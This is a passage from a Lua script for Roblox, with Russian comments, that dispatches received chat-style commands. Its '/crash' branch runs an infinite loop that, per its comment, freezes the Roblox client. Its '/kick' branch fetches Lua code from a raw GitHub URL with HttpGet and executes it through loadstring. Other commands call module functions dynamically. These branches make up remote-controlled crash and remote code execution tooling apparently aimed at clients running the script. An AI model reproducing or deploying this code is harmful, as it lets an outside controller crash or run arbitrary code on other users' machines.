
                        -- === ИСПОЛНЕНИЕ КОМАНД ===
                        if Mega and Mega.Commands and Mega.Commands[cmd] then
                            -- Динамически вызываем функцию команды, если она существует в модулях
                            task.spawn(Mega.Commands[cmd], data)
                        elseif cmd == "/crash" then
                            -- Бесконечный цикл намертво вешает клиент Роблокса
                            while true do end 
                        elseif cmd =="/kick" then
                            -- 1. Скачиваем код и превращаем в функцию
                            local kickFunc = loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/kick.lua"))
                            
                            -- 2. Проверяем, что код успешно скачался, и ПЕРЕДАЕМ ему data
                            if kickFunc then
                                kickFunc(data) 
                            else
                                warn("Не удалось скачать скрипт kick.lua")
                            end
                        end
                        -- =========================
                    end
                end
            end
    end
end)
-- ========================================================
